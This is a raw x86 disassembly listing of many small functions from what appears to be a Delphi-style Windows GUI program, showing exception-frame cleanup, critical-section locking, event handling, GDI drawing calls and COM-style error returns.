sub_415d3c
jmp sub_403858
sub_415d43
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_415da4
jmp sub_403858
sub_415dab
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415df0
mov eax [ eax + 0x4 ]
call sub_408244
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_415e00
mov eax [ eax + 0x4 ]
call sub_408270
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_415e3c
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_415fe5
jmp sub_403858
sub_416044
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_4160d4
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_416124
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41643f
jmp sub_403858
sub_416446
mov esp ebp
pop ebp
retn
sub_4164f0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
retn
sub_416578
mov [ eax + 0x18 ] edx
retn
sub_416580
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_4166f4
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_410bc4
retn
sub_41677b
jmp sub_403858
sub_416782
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41682e
jmp sub_403858
sub_416835
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4169d9
jmp sub_403858
sub_416a2b
jmp sub_403858
sub_416a4a
jmp sub_403858
sub_416a51
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416a70
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_416a69
jmp sub_403858
sub_416a70
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416b13
jmp sub_403858
sub_416b9b
jmp sub_403858
sub_416ba8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
pop ebx
retn
sub_416bc0
mov eax [ rw-data ]
call sub_416ba8
retn
sub_416bf8
push ebx
call sub_410a7c
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_416bc0
sub_416d65
jmp sub_403858
sub_416d6c
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403e54
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_416e8c
jmp sub_403858
sub_416e93
pop edi
pop esi
pop ebx
pop ebp
retn
sub_416f8a
jmp sub_403858
sub_416fa7
jmp sub_403858
sub_416fae
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4170ac
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_4159c4
mov edx [ ebx + 0x14 ]
sub edx [ ebx + 0x10 ]
sub eax edx
pop ebx
retn
sub_417170
push ebx
mov ebx eax
mov eax ebx
call sub_418b24
cmp al 0x9
sete al
pop ebx
retn
sub_4171cf
jmp sub_403858
sub_4171d6
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41727c
jmp sub_403858
sub_417283
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417502
jmp sub_4035a4
sub_41752e
jmp sub_4035a4
sub_4175d0
jmp sub_4035a4
sub_417673
jmp sub_4035a4
sub_41784b
jmp sub_4035a4
sub_41788d
jmp sub_403858
sub_4178bd
jmp sub_403858
sub_4178c4
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417933
jmp sub_403858
sub_417a0a
jmp sub_403858
sub_417a11
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417ce4
mov dl 0x1
call sub_416c4c
retn
sub_417e25
jmp sub_403858
sub_417e2c
pop ebx
mov esp ebp
pop ebp
retn
sub_417e34
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_418c34
mov eax [ rw-data ]
call sub_416ba8
pop ebp
retn
j_sub_4036d0
jmp sub_4036d0
j_sub_4036d0#2
jmp sub_4036d0
sub_418020
jmp sub_403858
sub_418027
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418107
jmp sub_403858
sub_41810e
mov esp ebp
pop ebp
retn
sub_4181c6
jmp sub_403858
sub_4181cd
pop ecx
pop ecx
pop ebp
retn
sub_4184cf
jmp sub_403858
sub_4184d6
pop ebx
mov esp ebp
pop ebp
retn
sub_41877b
jmp sub_403858
sub_418782
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
call sub_403104
retn
sub_41879b
jmp sub_403858
sub_4187bf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_4035a4
sub_4187f6
jmp sub_4035a4
sub_418835
jmp sub_403858
sub_41883c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41885e
lea eax [ ebp - 0x30 ]
mov edx 0x6
call sub_403e78
retn
sub_418857
jmp sub_403858
sub_41885e
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4188e5
jmp sub_4035a4
sub_418912
jmp sub_403858
sub_418919
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418924
push ecx
mov edx esp
mov ecx 0x4
call sub_4170e8
mov eax [ esp ]
cmp eax [ rw-data ]
je r-xdata
pop edx
retn
mov eax [ rw-data ]
call sub_416ba8
sub_418a31
jmp sub_403858
sub_418a38
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418b17
jmp sub_403858
sub_418b1e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418b74
jmp sub_403858
sub_418b7b
pop ebx
pop ecx
pop ebp
retn
sub_418dc3
jmp sub_403858
sub_418dca
pop ecx
pop ecx
pop ebp
retn
sub_418e0d
jmp sub_403858
sub_418e14
pop ebx
pop ecx
pop ebp
retn
sub_418eb0
jmp sub_403858
sub_418eb7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418f65
jmp sub_403858
sub_418f6c
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418f78
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4191d3
jmp sub_403858
sub_4191da
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4191ff
mov eax [ ebp - 0x8 ]
call sub_403104
mov eax [ ebp - 0x4 ]
call sub_403104
retn
sub_4191f8
jmp sub_403858
sub_4191ff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419224
lea eax [ ebp - 0x1c ]
call sub_4054f4
lea eax [ ebp - 0x18 ]
call sub_403e54
retn
sub_41921d
jmp sub_403858
sub_419224
pop ebx
mov esp ebp
pop ebp
retn
sub_419436
jmp sub_403858
sub_41943d
pop ebx
mov esp ebp
pop ebp
retn
sub_419490
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_415c28
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_4194a8
test dl dl
je r-xdata
mov dl 0x8
call sub_41962c
retn
mov dl 0x9
call sub_41962c
retn
sub_419530
mov dl 0x1
call sub_41962c
retn
sub_419538
xor edx edx
call sub_41962c
retn
sub_41961d
jmp sub_403858
sub_419624
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419640
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40cb1c
sub_419674
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_41968c
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_419698
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_41968c
sub_4197be
jmp sub_4035a4
sub_4197ed
jmp sub_403858
sub_419823
jmp sub_403858
sub_41982a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419849
push rw-data
call LeaveCriticalSection
retn
sub_419842
jmp sub_403858
sub_419849
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419918
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_419af4
sub_419978
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417c34
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_41998c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417c34
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_4199a0
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_4194bc
retn
sub_4199ac
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_4194bc
retn
sub_419c54
xor eax eax
retn
sub_419c58
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_419c60
xor eax eax
retn
sub_419c64
retn
sub_419c68
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403ea8
pop esi
pop ebx
retn
sub_419c7c
mov eax [ eax + 0x4 ]
retn
sub_419c80
retn
sub_419c84
xor eax eax
retn
sub_419c88
retn
sub_419c8c
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_419c98
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_419ca4
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_419cb0
retn
sub_419cb4
xchg edx eax
call sub_4178d8
retn
sub_419cbc
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_419d44
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403300
pop esi
retn
sub_419d58
retn
sub_419e38
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403ea8
pop esi
pop ebx
retn
sub_419e78
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_419fc4
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_40334c
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_419fdc
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_41a064
retn
sub_41a0ac
retn
sub_41a0e4
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41a0fc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_41a320
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403300
pop esi
pop ebx
retn
sub_41a144
mov al 0x1
retn
sub_41a148
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_41a150
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_41a1f8
xor eax eax
retn
sub_41a1fc
retn
sub_41a228
retn
sub_41a2c0
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_41a2d4
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_413c10
retn
sub_41a41b
jmp sub_4035a4
sub_41a420
mov ebx 0x1
call sub_40390c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a483
jmp sub_4035a4
sub_41a488
mov ebx 0x80030103
call sub_40390c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a506
jmp sub_4035a4
sub_41a50b
mov ebx 0x80030009
call sub_40390c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_41a569
jmp sub_4035a4
sub_41a56e
mov ebx 0x8000ffff
call sub_40390c
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a739
jmp sub_403858
j_sub_4035a4#6
jmp sub_4035a4
sub_41a74f
mov [ ebp - 0x4 ] 0x8000ffff
call sub_40390c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a778
lea eax [ ebp + 0xc ]
call sub_4054f4
retn
sub_41a771
jmp sub_403858
sub_41a778
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41a784
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41a790
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41a79c
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41a7a8
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41a817
jmp sub_4035a4
sub_41a81c
mov esi 0x8000ffff
call sub_40390c
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a830
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41a89d
jmp sub_403858
sub_41a8a4
mov eax [ rw-data ]
call sub_403104
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41a8b4
call sub_41355c
retn
sub_41a97c
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41ab20
jmp sub_403858
sub_41ab27
pop ebp
retn
sub_41abb5
jmp sub_403858
sub_41abbc
pop ebp
retn
sub_41aea5
jmp sub_403858
sub_41aeac
pop ebp
retn
sub_41aeb0
sub [ rw-data ] 0x1
retn
sub_41b400
inc ecx
add [ eax ] ch
iretd
sub_41b4a6
inc ecx
add [ esp + eax * 2 ] cl
inc ecx
add [ esp + eax * 2 ] dl
inc ecx
add ah ch
iretd
sub_41be98
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_41bf0c
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_41bf80
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41bf8c
add eax 0x8
push eax
call LeaveCriticalSection
retn
j_sub_403858#3
jmp sub_403858
sub_41c073
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c103
jmp sub_403858
sub_41c195
jmp sub_403858
sub_41c19c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c200
jmp sub_403858
sub_41c207
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c26f
jmp sub_403858
sub_41c276
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41c319
jmp sub_403858
sub_41c320
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c778
push 0x33
mov ecx rw-data
call sub_41381c
retn
sub_41c788
push 0x33
mov ecx rw-data
call sub_4137dc
retn
sub_41c798
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41c7bc
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_41c990
push 0x11
mov ecx rw-data
call sub_4137dc
retn
sub_41cad0
push ebx
mov ebx eax
mov eax ebx
call sub_41c798
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41cb8a
jmp sub_403858
sub_41cb91
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c7bc
retn
sub_41cba7
jmp sub_403858
sub_41cbc0
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41cc1d
jmp sub_403858
sub_41cc24
pop ebx
pop ecx
pop ebp
retn
sub_41cd9d
jmp sub_403858
sub_41cdc5
jmp sub_403858
sub_41cdcc
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41ce38
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_4040b8
pop esi
pop ebx
retn
sub_41ceac
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_41ce08
push eax
call MulDiv
neg eax
pop ebx
retn
sub_41cee8
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_41cf20
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_41cf50
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_41d06e
jmp sub_403858
sub_41d075
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c7bc
retn
sub_41d08b
jmp sub_403858
sub_41d101
jmp sub_403858
sub_41d108
pop ebx
pop ecx
pop ebp
retn
sub_41d10c
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_41d1c2
jmp sub_403858
sub_41d1d4
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_403300
sub_41d1e8
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41d218
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_41d327
jmp sub_403858
sub_41d32e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c7bc
retn
sub_41d344
jmp sub_403858
sub_41d3bd
jmp sub_403858
sub_41d3c4
pop ebx
pop ecx
pop ebp
retn
sub_41d4f5
jmp sub_403858
sub_41d508
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41d848
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_41da24
jmp sub_403858
sub_41da2b
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_41da34
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_41da6c
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41da78
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41dbb8
retn
sub_41dc81
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_41dc98
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41dd84
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41dda4
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41ddc4
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41dde4
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
pop ebx
retn
sub_41ddfc
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
pop ebx
retn
sub_41de20
mov eax [ rw-data ]
call sub_41ddfc
retn
sub_41de82
jmp sub_403858
sub_41de89
pop ecx
pop ebp
retn
sub_41df28
jmp sub_403858
sub_41df2f
pop ebx
mov esp ebp
pop ebp
retn
sub_41e001
jmp sub_403858
sub_41e092
jmp sub_403858
sub_41e099
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e0c4
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_41e1ab
jmp sub_403858
sub_41e358
jmp sub_403858
sub_41e35f
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_41e571
jmp sub_403858
sub_41e578
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_41e612
jmp sub_403858
sub_41e7ee
jmp sub_403858
sub_41e8a8
jmp sub_403858
sub_41e8af
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e8cf
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41e8c8
jmp sub_403858
sub_41e8cf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41ea5d
jmp sub_403858
sub_41ec28
jmp sub_403858
sub_41ec2f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec52
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026dc
retn
sub_41ec4b
jmp sub_403858
sub_41ec52
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ec72
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
sub_41ec6b
jmp sub_403858
sub_41ec72
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41ec7c
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_41eddc
push 0x0
call sub_41ed78
retn
sub_41ee81
jmp sub_403858
sub_41ee88
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41ee94
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_41ede4
pop ebx
pop ebp
retn 0x4
sub_41eea8
retn
sub_41eeac
test eax eax
jne r-xdata
retn
call sub_41eea8
sub_41f07f
jmp sub_403858
sub_41f0a6
jmp sub_403858
sub_41f0ad
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f0ec
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_41f2b9
mov eax [ ebp - 0xc ]
call sub_403104
retn
sub_41f2c2
jmp sub_403858
j_sub_41f2b9
jmp sub_41f2b9
sub_41f2c9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403104
retn
sub_41f2df
jmp sub_403858
sub_41f2f0
xor eax eax
retn
sub_41f2f4
mov al [ eax + 0x21 ]
retn
sub_41f340
jmp sub_403858
sub_41f347
pop esi
pop ecx
pop ebp
retn
sub_41f374
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_41f3cb
jmp sub_403858
sub_41f3d2
pop esi
pop ecx
pop ebp
retn
sub_41f3d8
retn
sub_41f3dc
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_41f3ec
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_41f571
jmp sub_403858
sub_41f578
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_41f697
jmp sub_403858
sub_41f69e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41f72f
jmp sub_403858
sub_41f736
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41f7be
jmp sub_403858
sub_41f7c5
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f94f
jmp sub_403858
sub_41f956
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41fb0c
jmp sub_4035a4
sub_41fb30
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f494
mov [ rw-data ] eax
sub_41fb50
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa1c
mov [ rw-data ] eax
sub_41fc78
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_41fc14
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_41fd20
jmp sub_4035a4
j_sub_4035a4#5
jmp sub_4035a4
sub_41fe64
jmp sub_403858
sub_41fe6b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fe74
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_41fc78
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_41fe8c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_41fc78
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
j_sub_4035a4#7
jmp sub_4035a4
sub_420053
jmp sub_403858
sub_42005a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4201f4
retn
sub_420394
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_420698
jmp sub_403858
sub_42069f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420817
jmp sub_403858
sub_42081e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4208ad
jmp sub_403858
sub_4208b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4208d6
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403e78
retn
sub_4208cf
jmp sub_403858
sub_4208d6
pop ebx
mov esp ebp
pop ebp
retn
sub_4208e9
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_420bd0
jmp r-xdata
retn
sub_4208ff
call sub_420c5c
retn
sub_4209f4
retn
sub_420c4c
jmp sub_403858
sub_420d77
jmp sub_403858
sub_420d7e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_420d97
jmp sub_403858
sub_420f6e
jmp sub_403858
sub_420f96
jmp sub_403858
sub_420f9d
mov esp ebp
pop ebp
retn
sub_421014
jmp sub_403858
sub_42111c
jmp sub_403858
sub_421207
jmp sub_403858
sub_421214
inc [ eax + 0x4 ]
retn
sub_42138f
jmp sub_403858
sub_421740
jmp sub_403858
sub_42198a
jmp sub_403858
sub_4219b4
jmp sub_403858
sub_4219bb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4219dd
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_4219d6
jmp sub_403858
j_sub_4035a4#9
jmp sub_4035a4
sub_421a36
jmp sub_403858
sub_421c63
jmp sub_403858
sub_421cab
jmp sub_403858
sub_421e18
jmp sub_403858
sub_421edf
jmp sub_4035a4
sub_421f34
mov [ eax + 0x31 ] 0x0
call sub_41f0ec
retn
sub_422185
jmp sub_403858
sub_4221f0
jmp sub_403858
sub_4221f7
pop edi
pop esi
